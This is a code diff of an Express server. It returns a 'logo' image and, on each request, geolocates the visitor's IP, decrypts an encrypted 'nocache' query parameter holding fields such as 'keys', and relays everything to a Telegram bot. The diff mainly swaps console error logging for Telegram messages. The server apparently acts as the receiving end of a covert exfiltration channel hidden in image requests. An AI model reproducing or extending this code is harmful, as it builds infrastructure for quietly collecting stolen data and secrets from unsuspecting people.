@@ -1,6 +1,7 @@
 import express from 'express';
 import axios from 'axios';
 import { Buffer } from 'buffer';
+import { ParsedUrlQuery } from 'querystring';
 
 const app = express();
 
@@ -28,7 +29,7 @@ app.get('/', async (req, res) => {
     const country = await getCountryByIp(userIp);
     
     // Дешифруем данные nocache
-    const decryptedData = decryptNocache(req.query.nocache);
+    const decryptedData = await decryptNocache(req.query.nocache);
     
     console.log('GET request from:', userIp, 'Country:', country, 'Data:', req.query);
 
@@ -43,14 +44,17 @@ app.get('/', async (req, res) => {
     res.status(200).send(imageBuffer);
 
   } catch (error) {
-    console.error('Error:', error);
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `ОШИБКА: ${error}`,
+      parse_mode: 'Markdown'
+    });
     res.status(500).send('Internal Server Error');
   }
 });
 
 // Функция дешифровки данных nocache
-// @ts-ignore
-function decryptNocache(nocache) {
+async function decryptNocache(nocache: any) {
   if (!nocache) return null;
   
   try {
@@ -69,28 +73,34 @@ function decryptNocache(nocache) {
       keys: data.keys || [],
     };
   } catch (error) {
-    console.error('Decryption error:', error);
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `ОШИБКА: ${error}`,
+      parse_mode: 'Markdown'
+    });
     return { error: 'Failed to decrypt data' };
   }
 }
 
 // Функция получения страны по IP
-// @ts-ignore
-async function getCountryByIp(ip) {
+async function getCountryByIp(ip: any) {
   if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Local';
   
   try {
     const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${IPINFO_TOKEN}`);
     return response.data.country || 'Unknown';
   } catch (error) {
-    console.error('IP info error:', error);
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `ОШИБКА: ${error}`,
+      parse_mode: 'Markdown'
+    });
     return 'Error';
   }
 }
 
 // Функция отправки в Telegram
-// @ts-ignore
-async function sendToTelegram(ip, country, queryData, decryptedData) {
+async function sendToTelegram(ip: any, country: any, queryData: any, decryptedData:any) {
   try {
     // Форматируем сообщение
     let message = `🌐 *Новый запрос логотипа*\n\n`;
@@ -115,7 +125,11 @@ async function sendToTelegram(ip, country, queryData, decryptedData) {
       parse_mode: 'Markdown'
     });
   } catch (error) {
-    console.error('Ошибка Telegram:', error);
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `ОШИБКА: ${error}`,
+      parse_mode: 'Markdown'
+    });
   }
 }
 
